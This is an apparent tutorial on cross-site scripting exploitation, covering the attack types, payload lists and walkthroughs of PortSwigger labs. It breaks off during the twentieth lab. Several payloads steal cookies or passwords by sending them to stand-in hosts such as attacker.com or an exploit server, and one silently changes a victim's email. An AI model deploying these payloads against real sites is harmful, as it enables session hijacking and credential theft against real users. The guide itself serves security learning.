# XSS Exploitation : Guide

*Because breaking web apps is fun and I love my life (just kidding... mostly)*

---

## Table of Contents

1. [Introduction](#introduction)
2. [What is XSS Anyway?](#what-is-xss)
3. [How XSS Works](#how-xss-works)
4. [Types of XSS Attacks](#types-of-xss)
5. [XSS Impact and Real-World Examples](#xss-impact)
6. [XSS Proof of Concept](#xss-poc)
7. [Testing for XSS Vulnerabilities](#testing-xss)
8. [PortSwigger XSS Labs - Let's Break Some Stuff](#portswigger-labs)
9. [Content Security Policy (CSP)](#csp)
10. [Prevention Techniques](#prevention)
11. [XSS Exploitation Techniques](#exploitation)
12. [Resources - Actually Good Ones](#resources)

---

## 1. Introduction

So you want to learn XSS? Good choice. It's probably one of the most satisfying vulnerabilities to exploit - there's something deeply entertaining about making someone else's browser execute your code. Plus, it's everywhere. I mean EVERYWHERE.

Despite being around since the late 90s, XSS is still showing up in major applications. Why? Because developers keep making the same mistakes, and honestly, securing web apps properly is harder than it looks. This guide will take you through everything - from the absolute basics to advanced exploitation that'll make you feel like a wizard.

Fair warning: This is a long one. I've included detailed walkthroughs of all 30+ PortSwigger labs because honestly, that's where you'll actually learn this stuff. Reading theory is fine, but you need to get your hands dirty.

Let's get into it.

---

## 2. What is XSS Anyway?

XSS is basically when you trick a website into executing your JavaScript in someone else's browser. That's it. The website trusts the input you give it, doesn't sanitize it properly, and boom - your code runs in the victim's browser as if it came from the legitimate site.

Here's what makes XSS dangerous: when your code runs in the victim's browser under the context of the vulnerable site, you bypass the Same-Origin Policy. This means you can do anything that the victim can do on that site. Read their data, perform actions, steal cookies, the whole nine yards.

Think of it like this: imagine you're at a coffee shop (the website), and there's a bulletin board (the web page). You post a note that says "Free coffee voucher - show this to the barista!" When someone reads your note and shows it to the barista, the barista gives them... whatever you told them to. Maybe it's actual coffee. Maybe it's a form asking for their credit card. The barista (browser) doesn't question it because it came from the bulletin board (trusted website).

Yeah, it's a terrible analogy, but you get the point.

---

## 3. How XSS Works

XSS works by manipulating a vulnerable website so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application.

### The Attack Flow:

```
1. Attacker identifies injection point
   ↓
2. Attacker crafts malicious payload
   ↓
3. Payload is delivered to target
   ↓
4. Vulnerable application includes payload in response
   ↓
5. Victim's browser executes malicious script
   ↓
6. Attacker gains access to sensitive data/functionality
```

### Simple Example:

**Vulnerable Code:**
```php
$search = $_GET['q'];
echo "<p>You searched for: " . $search . "</p>";
```

**Malicious Request:**
```
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
```

**Rendered HTML:**
```html
<p>You searched for: <script>alert(document.cookie)</script></p>
```

The browser interprets the `<script>` tag as legitimate code and executes it, even though it came from user input.

---

## 4. Types of XSS Attacks

XSS vulnerabilities are categorized into three main types, each with different characteristics and exploitation methods.

### 4.1 Reflected XSS

This is the easiest type to understand. You send someone a malicious link, they click it, and your payload executes. Simple as that.

The vulnerability exists because the server takes your input (usually from the URL) and immediately "reflects" it back in the response without proper encoding. So if you put `<script>alert(1)</script>` in the URL, and the server just echoes it back into the HTML... well, that's game over.

**Real example of what happens:**

You find a search feature:
```
https://vulnerable-site.com/search?q=test
```

The page shows: "You searched for: test"

You try:
```
https://vulnerable-site.com/search?q=<script>alert(document.cookie)</script>
```

The page shows: "You searched for: [alert fires with cookies]"

That's reflected XSS. Now you just need to trick someone into clicking your malicious URL. Phishing email, social media, shortened URL, whatever works.

**Why it matters:**
- Most common type of XSS
- Easy to exploit once you find it
- Can steal session tokens, redirect users, inject keyloggers
- Doesn't require database storage

The tricky part? Getting the victim to click your link. That's where social engineering comes in, but that's beyond the scope here.

---

### 4.2 Stored XSS (The Dangerous One)

Stored XSS is where things get spicy. Instead of needing the victim to click a link, your payload gets saved on the server (database, file system, wherever) and executes every time someone views that content.

Think blog comments, forum posts, user profiles, chat messages - anywhere user input gets stored and later displayed to other users.

**Why this is worse:**

1. No social engineering required - victims just visit a normal page
2. Affects multiple users (everyone who views the page)
3. Persistent - keeps working until someone notices and removes it
4. Higher impact potential

**Classic example:**

You're on a blog. You submit a comment:
```html
Nice post! <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
```

Now every single person who reads that blog post gets their cookies stolen. The site admin, other users, everyone. They're just reading comments and boom - compromised.

The 2005 MySpace Samy worm? That was stored XSS. One infected profile automatically infected every profile that viewed it, which then infected more profiles. It spread to over a million users in 20 hours. Absolute chaos.

**Common places to find stored XSS:**
- Comment sections (obviously)
- User profiles (bio, about me, etc.)
- Support tickets
- Product reviews  
- Chat applications
- Anywhere users can submit content that others will see

The key is finding input that gets displayed to other users. If only YOU see your input reflected back, that's not stored XSS - it's just reflected.

---

### 4.3 DOM-Based XSS (The Sneaky One)

DOM XSS is different. The vulnerability isn't in the server-side code at all - it's entirely in the client-side JavaScript. The server might be perfectly secure, but if the JavaScript does something stupid with user input, you've got XSS.

Here's what happens: JavaScript reads data from somewhere controllable (like the URL), and then does something dangerous with it - usually writing it to the page using `innerHTML`, `document.write()`, `eval()`, or similar functions.

**A simple vulnerable example:**

```javascript
// Read search term from URL
var search = new URLSearchParams(window.location.search).get('query');
// Write it directly to the page - BAD!
document.getElementById('results').innerHTML = 'You searched for: ' + search;
```

Now if you visit:
```
https://site.com/search?query=<img src=x onerror=alert(1)>
```

The JavaScript takes your payload from the URL and dumps it straight into the page. The server never even sees the malicious code - it's all happening in your browser.

**Why this matters:**

1. Server-side security measures might not catch it
2. WAFs often miss it because the payload never hits the server
3. Code review might miss it if they only check server-side code
4. It's harder to detect with automated scanners

**Common sources (where the data comes from):**
- `location.search` (URL parameters)
- `location.hash` (fragment identifier - the part after #)
- `document.referrer`
- `document.cookie`
- `localStorage` / `sessionStorage`

**Common sinks (dangerous functions):**
- `innerHTML` / `outerHTML`
- `document.write()`
- `eval()`
- `setTimeout()` / `setInterval()`
- Setting `element.src` for scripts/iframes
- jQuery's `$()` selector with HTML

The fun part about DOM XSS? Sometimes you can combine it with reflected or stored data. Maybe the server stores your username, and then JavaScript reads it from the page and does something unsafe with it. Best of both worlds (for attackers).

**Example Attack:**

```javascript
// Vulnerable code
var url = new URL(window.location);
var searchTerm = url.searchParams.get("search");
document.getElementById("results").innerHTML = searchTerm;
```

Malicious URL:
```
https://site.com/search?search=<img src=x onerror=alert(1)>
```

---

### 4.4 Comparison Table

| Feature | Reflected XSS | Stored XSS | DOM-Based XSS |
|---------|---------------|------------|---------------|
| **Persistence** | No | Yes | No (usually) |
| **Server-Side** | Yes | Yes | No |
| **Victim Action** | Click link | Visit page | Click link (usually) |
| **Detection** | Easier | Easier | Harder |
| **Impact** | Single user | Multiple users | Single user |
| **Payload Storage** | Not stored | Database/files | Client-side |

---

## 5. XSS Impact and Real-World Examples

### 5.1 Impact Levels

The severity of XSS depends on:
1. **Application Type**: Banking vs. public blog
2. **Data Sensitivity**: Personal info, financial data, health records
3. **User Privileges**: Regular user vs. administrator
4. **Context**: Public-facing vs. internal application

### 5.2 Potential Consequences

#### Low Impact Scenarios:
- Public brochureware sites with anonymous users
- No sensitive data or actions
- Limited functionality

#### Medium Impact Scenarios:
- Theft of session tokens
- Defacement of web pages
- Redirection to phishing sites
- Social engineering attacks

#### High Impact Scenarios:
- Theft of sensitive personal data
- Financial fraud
- Credential harvesting
- Installation of malware/keyloggers

#### Critical Impact Scenarios:
- Complete account takeover of privileged users
- Access to backend systems
- Lateral movement within networks
- Data breach of customer information
- Compliance violations (GDPR, HIPAA, etc.)

### 5.3 Real-World XSS Attacks

#### 1. Twitter XSS Worm (2014)
An Austrian teenager discovered Twitter's feed was vulnerable to XSS when experimenting with Unicode characters. Within hours, a self-retweeting tweet exploiting XSS spread across the platform, forcing Twitter to implement emergency fixes.

#### 2. British Airways Data Breach (2018)
Attackers injected malicious JavaScript into British Airways' website that captured credit card data from approximately 380,000 transactions. The company was fined £20 million for the breach.

#### 3. eBay Persistent XSS (2015-2016)
Security researchers discovered persistent XSS vulnerabilities in eBay's platform that remained unpatched for months, potentially affecting millions of users.

#### 4. PayPal XSS Vulnerability (2013)
A critical XSS flaw in PayPal could have allowed attackers to steal funds and personal information from user accounts.

---

## 6. XSS Proof of Concept

### 6.1 Classic Payloads

**Standard Alert:**
```javascript
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
```

**Note**: Chrome version 92+ (July 2021) prevents `alert()` in cross-origin iframes. Alternative: `print()` function.

```javascript
<script>print()</script>
```

### 6.2 Alternative PoC Methods

**Console Logging:**
```javascript
<script>console.log('XSS Vulnerability')</script>
```

**DOM Manipulation:**
```javascript
<script>document.body.innerHTML = "XSS"</script>
```

**External Script Loading:**
```javascript
<script src="https://your-server.com/xss.js"></script>
```

### 6.3 Event Handlers

```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<div onmouseover=alert(1)>test</div>
```

### 6.4 Context-Specific Payloads

**HTML Context:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
```

**Attribute Context:**
```html
" onclick="alert(1)
" onfocus="alert(1)" autofocus="
' onmouseover='alert(1)
```

**JavaScript String Context:**
```javascript
'-alert(1)-'
';alert(1);//
</script><script>alert(1)</script>
```

---

## 7. Testing for XSS Vulnerabilities

### 7.1 Manual Testing Methodology

**Step 1: Identify Input Points**
- Form fields (text, textarea, hidden)
- URL parameters
- HTTP headers (User-Agent, Referer, Cookie)
- File uploads
- API endpoints
- WebSocket messages

**Step 2: Submit Test Strings**

Use unique alphanumeric strings to track reflection:
```
test123XSS456
xsstest789
UNIQUE_STRING_12345
```

**Step 3: Locate Reflection Points**

Use browser DevTools or Burp Suite to find where input appears:
- HTML body
- HTML attributes
- JavaScript blocks
- CSS
- HTTP response headers

**Step 4: Analyze Context**

Determine what characters are allowed/blocked:
```
<>"'();
```

**Step 5: Craft Contextual Payload**

Based on the context, create appropriate payload:
- Break out of current context
- Inject executable code
- Balance any syntax requirements

**Step 6: Test Payload**

Submit payload and verify execution:
- Check for alert/console message
- Verify DOM changes
- Monitor network requests

### 7.2 Common Test Vectors

**Basic Tests:**
```html
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Attribute Escape:**
```html
" onload="alert(1)
' onfocus='alert(1)' autofocus='
</textarea><script>alert(1)</script>
```

**JavaScript Context:**
```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
```

**Encoding Variations:**
```html
<script>alert(1)</script>
&lt;script&gt;alert(1)&lt;/script&gt;
<script>alert(String.fromCharCode(88,83,83))</script>
```

### 7.3 Automated Testing Tools

**Burp Suite Scanner:**
- Comprehensive XSS detection
- Context-aware payloads
- Automatic verification

**XSSer:**
```bash
xsser --url "http://target.com/search?q=XSS"
```

**XSStrike:**
```bash
xsstrike -u "http://target.com/search?q=test"
```

**Dalfox:**
```bash
dalfox url "http://target.com/search?q=test"
```

### 7.4 Browser DevTools Testing

**1. Elements Panel:**
- Inspect where input is reflected
- Check for encoding/filtering

**2. Console:**
- Test JavaScript execution
- Monitor errors

**3. Network Panel:**
- Analyze requests/responses
- Check for WAF blocking

**4. Application Panel:**
- Examine cookies
- Check localStorage/sessionStorage

---

## 8. PortSwigger XSS Labs - Let's Break Some Stuff

Alright, here's where we get practical. PortSwigger's Web Security Academy has about 30 XSS labs that range from "baby's first XSS" to "what the actual hell is this sorcery." I've done them all, multiple times, and I'm going to walk you through each one.

Quick note: Some of these solutions might seem different from what you find elsewhere. That's because there are often multiple ways to solve them. I'm showing you what worked for me and explaining WHY it works.

Also, PortSwigger updated their labs to use `print()` instead of `alert()` for some of them because Chrome decided to block `alert()` in cross-origin iframes. Thanks Chrome. Real helpful.

### Lab Categories:
- **Apprentice**: Basic stuff, good for beginners
- **Practitioner**: You need to understand contexts and bypasses  
- **Expert**: Pain. Just pain. (But satisfying when you solve them)

Let's do this.

---

### 8.1 Reflected XSS Labs

#### Lab 1: Reflected XSS into HTML context with nothing encoded

**Difficulty**: Apprentice (literally the easiest one)
**Goal**: Make `alert()` fire

**What's going on:**
This is XSS with training wheels. The site takes your search term and just... puts it right into the HTML. No filtering, no encoding, nothing. It's like the developers actively wanted you to hack it.

**Solution:**

1. Find the search box (it's right there on the homepage)
2. Type this:
```html
<script>alert(1)</script>
```
3. Hit enter
4. Watch the alert popup
5. Feel briefly proud before realizing this was the tutorial level

**Why it works:**
The application literally just does this:
```html
<p>You searched for: <script>alert(1)</script></p>
```

The browser sees `<script>` tags and goes "oh cool, JavaScript!" and executes it. That's it. That's the whole vulnerability.

**Real-world lesson:**
If you ever find XSS this easy in the wild, buy a lottery ticket because you're having a lucky day. Most sites have at least SOME protection. But hey, it happens more often than you'd think.

---

#### Lab 2: Stored XSS into HTML context with nothing encoded

**Difficulty**: Apprentice  
**Objective**: Submit a comment that calls the `alert` function when the blog post is viewed

**Description**: This lab contains a stored XSS vulnerability in the comment functionality.

**Solution**:

1. Navigate to any blog post
2. Scroll to the comment section
3. Enter the following payload in the comment field:
```html
<script>alert(1)</script>
```
4. Fill in the required name and email fields
5. Submit the comment
6. The alert executes immediately and on every page load

**Explanation**: The application stores the comment in its database without sanitization and includes it in the page HTML whenever the post is viewed. This affects all users who visit the page.

**Key Takeaway**: Stored XSS is generally more dangerous than reflected XSS because it doesn't require user interaction beyond visiting an affected page.

---

#### Lab 3: DOM XSS in `document.write` sink using source `location.search`

**Difficulty**: Apprentice  
**Objective**: Call the `alert` function

**Description**: This lab contains a DOM-based XSS vulnerability in the search functionality that uses `document.write`.

**Solution**:

1. Access the lab and inspect the page source
2. Find JavaScript code that reads from `location.search` and writes to the document
3. Craft a payload that breaks out of the current context:
```html
"><script>alert(1)</script>
```
4. Enter this in the search box or directly in the URL:
```
https://lab-id.web-security-academy.net/?search="><script>alert(1)</script>
```
5. The alert executes

**Vulnerable Code Example**:
```javascript
var search = new URLSearchParams(window.location.search).get('search');
document.write('<img src="/resources/images/tracker.gif?search=' + search + '">');
```

**Explanation**: The code reads from `location.search` (URL parameter) and writes it directly into the document using `document.write()` without sanitization. By closing the `img` tag and starting a `script` tag, we can inject executable code.

**Key Takeaway**: Avoid using `document.write()` with user-controlled data. Use safer alternatives like `textContent` or properly validate and encode all input.

---

#### Lab 4: DOM XSS in `innerHTML` sink using source `location.search`

**Difficulty**: Apprentice  
**Objective**: Call the `alert` function

**Description**: This lab contains a DOM-based XSS in the search functionality using `innerHTML`.

**Solution**:

1. Analyze the page JavaScript
2. Note that `innerHTML` is used to display search results
3. Submit the following payload:
```html
<img src=1 onerror=alert(1)>
```
4. The alert executes

**Vulnerable Code**:
```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

**Explanation**: While `innerHTML` doesn't execute `<script>` tags, it does process HTML and can execute event handlers like `onerror`, `onload`, etc.

**Key Takeaway**: `innerHTML` is not safe for untrusted data. Use `textContent` or properly sanitize input with a library like DOMPurify.

---

#### Lab 5: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

**Difficulty**: Apprentice  
**Objective**: Make the "back" link alert `document.cookie`

**Description**: This lab contains a DOM-based XSS in the submit feedback page using jQuery.

**Solution**:

1. Go to the "Submit feedback" page
2. Notice the "Back" link at the bottom
3. Modify the URL to include:
```
?returnPath=javascript:alert(document.cookie)
```
4. Full URL:
```
https://lab-id.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```
5. Click the "Back" link
6. The alert executes with cookies displayed

**Vulnerable Code**:
```javascript
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

**Explanation**: The code reads `returnPath` from the URL and sets it as the `href` attribute of a link. By using the `javascript:` protocol, we can execute arbitrary code when the link is clicked.

**Key Takeaway**: Validate and whitelist URLs. Never allow `javascript:`, `data:`, or `vbscript:` protocols in href attributes.

---

#### Lab 6: DOM XSS in jQuery selector sink using a hashchange event

**Difficulty**: Apprentice  
**Objective**: Deliver an exploit that calls the `print()` function

**Description**: This lab contains a DOM-based XSS using jQuery's `$()` selector function with `location.hash`.

**Solution**:

1. Analyze the page's JavaScript
2. Notice it uses jQuery selector with hash
3. Exploit server hosting an iframe:
```html
<iframe src="https://lab-id.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'">
</iframe>
```
4. Deliver this to the victim
5. When loaded, the `print()` function executes

**Vulnerable Code**:
```javascript
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

**Explanation**: The jQuery selector is vulnerable because it interprets HTML if the selector string contains `<` characters. The `hashchange` event fires when the URL fragment changes.

**Key Takeaway**: Be cautious with jQuery selectors that use user input. Always validate and sanitize data before using it in selectors.

---

#### Lab 7: Reflected XSS into attribute with angle brackets HTML-encoded

**Difficulty**: Apprentice  
**Goal**: Break out of an HTML attribute

**What's happening:**
Now we're getting somewhere. This lab actually tries to be secure - it encodes `<` and `>` so you can't inject new tags. But here's the thing: your input is reflected inside an attribute value, and quotes aren't encoded. Rookie mistake.

**Solution:**

Test with basic payload - you'll see angle brackets get encoded. But check where your input appears in the HTML:
```html
<input type="text" value="YOUR_INPUT_HERE">
```

Since we're inside quotes and they're not escaped, just break out:
```html
" onmouseover="alert(1)
```

This closes the `value` attribute and adds a new `onmouseover` attribute. Move your mouse over the input field and boom - alert fires.

**Full rendered HTML:**
```html
<input type="text" value="" onmouseover="alert(1)">
```

**The lesson:**
Context matters. HTML encoding for angle brackets doesn't help if you're inside an attribute and quotes aren't escaped. You need to encode based on WHERE the data appears:
- HTML body? Encode `<`, `>`, `&`
- HTML attribute? Also encode `"` and `'`
- JavaScript? Whole different ballgame
- URL? Yet another encoding scheme

This is why XSS is so persistent - developers focus on one context and forget about others.

---

#### Lab 8: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

**Difficulty**: Apprentice  
**Objective**: Submit a comment that calls the `alert` function when the name is clicked

**Description**: The website field in comments is vulnerable to XSS but double quotes are HTML-encoded.

**Solution**:

1. Go to a blog post's comment section
2. In the "Website" field, enter:
```javascript
javascript:alert(1)
```
3. Fill in other required fields (Name, Email, Comment)
4. Submit the comment
5. Click on the commenter's name link
6. The alert executes

**Rendered HTML**:
```html
<a id="author" href="javascript:alert(1)">Your Name</a>
```

**Explanation**: The `javascript:` URL scheme allows execution of JavaScript code when the link is clicked. Even though quotes are encoded, the `javascript:` protocol doesn't require them.

**Key Takeaway**: Validate URL schemes. Only allow `http:` and `https:` protocols in href attributes. Use a URL parsing library to validate.

---

#### Lab 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded

**Difficulty**: Apprentice  
**Objective**: Break out of the JavaScript string and call the `alert` function

**Description**: The search term is reflected inside a JavaScript string literal, and angle brackets are HTML-encoded.

**Solution**:

1. Test payloads and observe the reflection context
2. Find that input is inside a JavaScript string
3. Break out with:
```javascript
'-alert(1)-'
```
or
```javascript
';alert(1);//
```
4. Enter this in search
5. The alert executes

**Vulnerable Code**:
```javascript
var searchTerms = 'YOUR_INPUT';
```

**After Injection**:
```javascript
var searchTerms = ''-alert(1)-'';
// or
var searchTerms = '';alert(1);//';
```

**Explanation**: By terminating the string with a single quote, we can inject JavaScript code. The `-` is a valid JavaScript operator that subtracts, and the comment `//` ignores everything after.

**Key Takeaway**: When reflecting user input in JavaScript, escape single quotes, double quotes, and backslashes. Better yet, use JSON encoding.

---

### 8.2 Advanced Reflected XSS Labs

#### Lab 10: DOM XSS in `document.write` sink using source `location.search` inside a select element

**Difficulty**: Practitioner  
**Objective**: Call the `alert` function

**Description**: The lab contains DOM XSS in the product stock checker where the store ID is written using `document.write` inside a `<select>` element.

**Solution**:

1. Access any product page
2. Inspect the "Check stock" feature
3. Notice `storeId` parameter in URL
4. Close the `</select>` tag and inject a script:
```html
</select><script>alert(1)</script>
```
5. Full URL:
```
https://lab-id.web-security-academy.net/product?productId=1&storeId=</select><script>alert(1)</script>
```
6. Load this URL
7. The alert executes

**Vulnerable Code**:
```javascript
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select>');
for(var i=0;i<stores.length;i++) {
    document.write('<option value="'+i+'">'+stores[i]+'</option>');
}
document.write('</select>');
```

**Key Takeaway**: Context-aware escaping is crucial. Know what HTML context your data will appear in and escape appropriately.

---

#### Lab 11: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Difficulty**: Practitioner  
**Objective**: Perform an XSS attack that executes an AngularJS expression

**Description**: The search functionality uses AngularJS and reflects the search term in an `ng-app` directive scope.

**Solution**:

1. Notice the page uses AngularJS (look for `ng-app` in HTML)
2. AngularJS expressions are evaluated within `{{}}` syntax
3. Enter the following in search:
```
{{$on.constructor('alert(1)')()}}
```
4. The alert executes

**Explanation**: AngularJS evaluates expressions within `{{}}`. The `$on.constructor` is a way to access the Function constructor in AngularJS and execute arbitrary JavaScript.

**Alternative Payloads**:
```
{{constructor.constructor('alert(1)')()}}
{{7*7}}
{{this.constructor.constructor('alert(1)')()}}
```

**Key Takeaway**: Client-side frameworks like AngularJS have their own templating engines that can be exploited. Use sandboxed mode or the latest versions which have better protections.

---

#### Lab 12: Reflected DOM XSS

**Difficulty**: Practitioner  
**Objective**: Call the `alert()` function

**Description**: This lab demonstrates reflected DOM vulnerabilities where the server echoes data in a response, which is then processed unsafely by JavaScript.

**Solution**:

1. Use Burp Suite to intercept the search request
2. Notice the response contains a JSON object
3. In the search functionality, search for a test string
4. Intercept the request in Burp and forward it
5. In the response, notice the search term in JSON
6. The JSON response is processed by `eval()`
7. Payload to escape the JSON and execute code:
```
\"-alert(1)}//
```
8. Enter this in search
9. The alert executes

**Explanation**: The application returns search results in JSON format, which is then processed using `eval()`. By injecting a backslash, we can escape the escaping mechanism and break out of the JSON string context.

**Vulnerable Code**:
```javascript
eval('var searchResultsObj = ' + this.responseText);
```

**Key Takeaway**: Never use `eval()` with user data, even if it appears to be properly encoded. Use `JSON.parse()` instead.

---

#### Lab 13: Stored DOM XSS

**Difficulty**: Practitioner  
**Objective**: Exploit the stored DOM XSS vulnerability to call the `alert()` function

**Description**: This lab demonstrates stored DOM XSS where data is stored on the server and later processed unsafely by client-side JavaScript.

**Solution**:

1. Go to a blog post and access the comment section
2. Notice comments are loaded via JavaScript
3. Submit a comment with the following payload:
```html
<><img src=1 onerror=alert(1)>
```
4. The comment gets stored and executed when loaded
5. The alert fires

**Vulnerable Code**:
```javascript
loadComments(postId).then(comments => {
    let commentSection = document.getElementById('comment-section');
    comments.forEach(comment => {
        let commentDiv = document.createElement('div');
        commentDiv.innerHTML = comment.body;
        commentSection.appendChild(commentDiv);
    });
});
```

**Explanation**: Comments are loaded via AJAX and inserted into the DOM using `innerHTML`. This processes HTML and executes event handlers.

**Key Takeaway**: Just because XSS is stored doesn't mean it's server-side. Client-side processing of stored data can also be vulnerable.

---

#### Lab 14: Exploiting cross-site scripting to steal cookies

**Difficulty**: Practitioner  
**Goal**: Use XSS to steal admin cookies and hijack their session

**The scenario:**
You've got a stored XSS in blog comments. Now we're going to weaponize it to actually steal something useful - the admin's session cookie. This is where XSS goes from "neat trick" to "oh shit, we're compromised."

**Solution:**

First, you need somewhere to send the stolen cookies. PortSwigger gives you an exploit server for this.

In the comments, drop this payload:
```html
<script>
fetch('https://YOUR-EXPLOIT-SERVER.exploit-server.net/log?cookie=' + document.cookie);
</script>
```

Or if you want to be more subtle (and avoid fetch blocking):
```html
<script>
document.write('<img src="https://YOUR-EXPLOIT-SERVER.exploit-server.net/steal?c=' + document.cookie + '">');
</script>
```

Post the comment. When the admin views it (they simulate this in the lab), their browser executes your script and sends their cookies to your server.

Check your exploit server's access log - you'll see something like:
```
GET /log?cookie=session=abc123xyz789...
```

Grab that session cookie, open Burp Suite, replace your session cookie with the admin's, refresh the page, and you're now logged in as admin. GG.

**Why this works:**
- JavaScript can read `document.cookie` (unless HttpOnly flag is set - spoiler: it's not set here)
- The script runs in the context of the vulnerable site, so Same-Origin Policy doesn't protect the cookie
- Admin's browser happily sends the cookie because the request appears to come from legitimate page JavaScript

**Defense:**
Set the HttpOnly flag on your session cookies. Seriously. It's one line of code:
```
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

That HttpOnly flag prevents JavaScript from reading the cookie. Won't stop all XSS attacks, but it stops this specific one cold.

---

#### Lab 15: Exploiting cross-site scripting to capture passwords

**Difficulty**: Practitioner  
**Objective**: Exploit the XSS to steal the administrator's password

**Description**: This lab contains a stored XSS in blog comments. You must inject a password-stealing payload.

**Solution**:

1. Access the exploit server
2. Go to a blog post
3. Submit the following comment:
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
4. This injects a fake login form
5. When the admin views the page and enters their credentials, they're sent to your server
6. Check your exploit server logs for the credentials
7. Log in as administrator

**Alternative Payload**:
```html
<script>
document.write('<form id="phish"><input type="text" name="username"><input type="password" name="password"></form>');
document.getElementById('phish').addEventListener('submit', function(e) {
    e.preventDefault();
    fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?creds=' + 
          encodeURIComponent(e.target.username.value + ':' + e.target.password.value));
});
</script>
```

**Explanation**: By injecting form fields that look legitimate, we can capture credentials when they're entered. The `onchange` event fires when the password field value changes.

**Key Takeaway**: XSS can be used for sophisticated attacks beyond cookie theft, including credential harvesting through fake forms or keylogging.

---

#### Lab 16: Exploiting XSS to perform CSRF

**Difficulty**: Practitioner  
**Objective**: Exploit the XSS vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments

**Description**: This lab contains a stored XSS in blog comments and an email change function vulnerable to CSRF.

**Solution**:

1. First, understand the email change functionality
2. Change your own email and capture the request in Burp:
```http
POST /my-account/change-email HTTP/1.1
...
email=newemail@example.com
```
3. Notice there's no CSRF token
4. Create a payload that submits this request:
```html
<script>
var req = new XMLHttpRequest();
req.open('POST', '/my-account/change-email', true);
req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req.send('email=hacked@evil.com');
</script>
```
5. Submit this as a comment
6. When the victim views the comment, their email is changed
7. Lab solved

**Explanation**: Since the application doesn't use CSRF tokens and allows state-changing operations without verification, XSS can be used to make authenticated requests on behalf of the victim.

**Key Takeaway**: XSS can bypass CSRF protections. Defense in depth requires both XSS prevention and CSRF tokens.

---

#### Lab 17: Reflected XSS into HTML context with most tags and attributes blocked

**Difficulty**: Practitioner  
**Objective**: Bypass tag filtering and call the `print()` function

**Description**: This lab contains a reflected XSS with a WAF that blocks most tags and attributes.

**Solution**:

1. Test various tags to find which ones are allowed
2. Use Burp Intruder to brute force allowed tags:
```html
<§§>
```
Load payload list from: PortSwigger XSS cheat sheet tags
3. Find that `<body>` tag is allowed
4. Test which event handlers work with `<body>`
5. Find that `onresize` is allowed
6. Craft the exploit:
```html
<body onresize=print()>
```
7. This needs to be delivered in an iframe that auto-resizes:
```html
<iframe src="https://LAB-ID.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'>
```
8. Store this on the exploit server
9. Deliver to victim
10. Lab solved

**Explanation**: By systematically testing which tags and attributes are allowed, we can find a combination that bypasses the filter. The `onresize` event fires when the window is resized.

**Key Takeaway**: WAF bypasses often require creativity and persistence. Blacklists are inherently flawed - use allowlists instead.

---

#### Lab 18: Reflected XSS into HTML context with all tags blocked except custom ones

**Difficulty**: Practitioner  
**Objective**: Bypass the filter using custom tags

**Description**: This lab blocks all standard HTML tags but allows custom tags.

**Solution**:

1. Test and find that standard tags like `<script>`, `<img>` are blocked
2. Custom tags are allowed
3. Create a custom tag with an event handler:
```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
4. URL encode and craft the full exploit:
```
https://LAB-ID.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie)+tabindex=1>#x
```
5. The `#x` makes the browser auto-focus on the element with id=x
6. The alert executes
7. Lab solved

**Alternative Payload**:
```html
<mycustomtag id=x onfocus=alert(1) tabindex=1>#x
```

**Explanation**: Browsers allow custom HTML tags and will still process event handlers on them. The `tabindex` makes the element focusable, and the `#x` fragment causes auto-focus.

**Key Takeaway**: Blacklisting specific tags is ineffective. Any tag can have event handlers. Proper output encoding is the only reliable defense.

---

#### Lab 19: Reflected XSS with some SVG markup allowed

**Difficulty**: Practitioner  
**Objective**: Bypass the filter using SVG tags

**Description**: This lab blocks most tags but allows some SVG elements.

**Solution**:

1. Use Burp Intruder to test which tags are allowed
2. Find that `<svg>` and `<animatetransform>` are allowed
3. Craft a payload using allowed SVG elements:
```html
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```
4. Submit this in the search box
5. The alert executes
6. Lab solved

**Alternative SVG Payloads**:
```html
<svg><animate onbegin=alert(1) attributeName=x>
<svg><set onbegin=alert(1) attributeName=x>
<svg><title><a id=x href=javascript:alert(1)>
```

**Explanation**: SVG elements have their own event handlers and animation events. The `onbegin` event fires when the animation starts.

**Key Takeaway**: SVG elements provide many XSS vectors that are often overlooked by filters.

---

#### Lab 20: Reflected XSS in canonical link tag

**Difficulty**: Practitioner  
**Objective**: Inject a payload into a canonical link tag

**Description**: This lab reflects user input into a canonical link tag. You must inject a payload that calls `alert()` when a key is pressed.

**Solution**:

1. Notice the canonical link in page source:
```html
<link rel="canonical" href="https://LAB-ID.web-security-academy.net/?"/>
```
